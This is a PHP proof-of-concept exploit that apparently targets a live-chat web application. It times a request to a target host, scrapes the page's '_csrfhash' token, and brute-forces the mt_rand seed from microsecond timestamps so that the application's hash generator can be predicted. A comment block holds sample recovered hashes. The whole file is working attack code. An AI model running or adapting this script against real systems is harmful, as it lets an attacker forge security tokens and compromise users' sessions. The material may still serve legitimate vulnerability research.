<?php

function BuildHash()
{
	return BuildHashBlock() . BuildHashBlock() . BuildHashBlock() . BuildHashBlock();
}

/**
 * Build a Unique Hash Block
 *
 * @author John Haugeland
 * @return string The Hash Block
 */
function BuildHashBlock()
{
    $sub = mt_rand(0, 36 * 36 * 36);
	$Ch1to3 = $sub - 1;		// largest alphanum power that'll fit in the minimum guaranteed 16-bit range for mt_randmax()
    $sec = mt_rand(0, 36 * 36);
	$Ch4to5 = $sec - 1;
	$Ch6to8 = hexdec(substr(uniqid(), -6)) % (36 * 36 * 36);  // only want the bottom two characters of entropy, but clip a large range to keep from much influencing probability

	return str_pad(base_convert($Ch1to3, 10, 36), 3, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch4to5, 10, 36), 2, '0', STR_PAD_LEFT) . str_pad(base_convert($Ch6to8, 10, 36), 3, '0', STR_PAD_LEFT);
}

function getHash() {
    global $base_url;
    $response = file_get_contents($base_url);
    preg_match('~name="_csrfhash" value="([^"]*)"~', $response, $matches);
    return $matches[1];
}

function getRandsFromHash($block) {
    $first = base_convert(substr($block, 0, 3), 36, 10) + 1; // mod 46656
    $second = base_convert(substr($block, 3, 2), 36, 10) + 1; // mod 1296
    return array($first, $second);
}

$base_url = 'http://172.16.122.131:8333';

$start = microtime(true);
file_get_contents($base_url . "/visitor/index.php?/LiveChat/VisitorUpdate/UpdateFootprint/_isFirstTime=0/_sessionID=1");
$end = microtime(true);

/*
1465255193.3 1465206926 0.48267300
mt_rand: 22922 532
mt_rand: 22421 289
mt_rand: 17641 1143
mt_rand: 24618 375
hoper914has8095tdm0vq98niztae9bb
mt_rand: 24612 225
mt_rand: 8066 1207
mt_rand: 18817 272
mt_rand: 40342 761
izn68eiu681xiempeio7jeq9v4ll4ey1
mt_rand: 23164 796
mt_rand: 13126 217
mt_rand: 4383 22
mt_rand: 14012 1222
hvfm3f33a4l60f6u3dq0lfacat7xxfdv

*/


// $hash = 'hvfm3f33a4l60f6u3dq0lfacat7xxfdv';
// $start = $end = 1465206926.48267300;
// $end += 0.2;



$hash = getHash();
echo "Got hash $hash\n";
$seed = findSeed($hash, $start, $end);
echo "$seed\n";


function findSeed($hash, $start, $end) {
    list($first, $second) = getRandsFromHash($hash);
    printf("Working from %.6f to %.6f\n", $end, $start);
    $start_usec = $start * 1e6;
    $end_usec = $end * 1e6;

    $current_usec = $end_usec;
    while ($current_usec >= $start_usec) {
        $seconds = floor($current_usec / 1e6);
        $usec = ($current_usec % 1e6) / 1e6;

        $seed = (float) $seconds + ((float) $usec * 100000);
        mt_srand($seed);
        for ($i = 0; $i < 40; $i++) {
            if (mt_rand(0, 36 * 36 * 36) == $first && mt_rand(0, 36 * 36) == $second) {
                return $seed;
            }
        }

        $current_usec -= 1;
    }
    die('seed not found');
}
